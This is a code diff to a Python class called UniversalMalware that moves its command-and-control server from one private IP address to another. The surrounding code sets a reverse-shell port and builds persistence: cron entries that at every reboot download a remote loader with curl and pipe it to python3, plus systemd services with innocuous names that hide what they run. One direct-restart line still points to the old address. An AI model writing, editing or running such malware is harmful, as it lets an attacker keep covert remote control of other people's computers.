@@ -14,7 +14,7 @@ import platform
 
 class UniversalMalware:
     def __init__(self):
-        self.c2_server = "192.168.1.167"
+        self.c2_server = "192.168.1.151"
         self.c2_port = "8000"
         self.rev_port = "4444"
         self.is_root = os.geteuid() == 0  # Check if root
@@ -128,7 +128,7 @@ class UniversalMalware:
             "systemctl is-active system-network.service >/dev/null 2>&1 || systemctl start system-network.service",
             
             # Check cron
-            "crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
+            "crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.151:8000/loader.py | python3 -') | crontab -",
             
             # Direct restart if needed
             "curl -s http://192.168.1.167:8000/loader.py | python3 - &"
@@ -147,13 +147,13 @@ class UniversalMalware:
         """Check and repair user-level persistence"""
         checks = [
             # Check user cron
-            "crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
+            "crontab -l | grep -q 'loader.py' || (crontab -l 2>/dev/null; echo '@reboot curl -s http://192.168.1.151:8000/loader.py | python3 -') | crontab -",
             
             # Check user systemd
             "systemctl --user is-active user-monitor.service >/dev/null 2>&1 || systemctl --user start user-monitor.service 2>/dev/null || true",
             
             # Direct restart
-            "curl -s http://192.168.1.167:8000/loader.py | python3 - &"
+            "curl -s http://192.168.1.151:8000/loader.py | python3 - &"
         ]
         
         for check in checks:
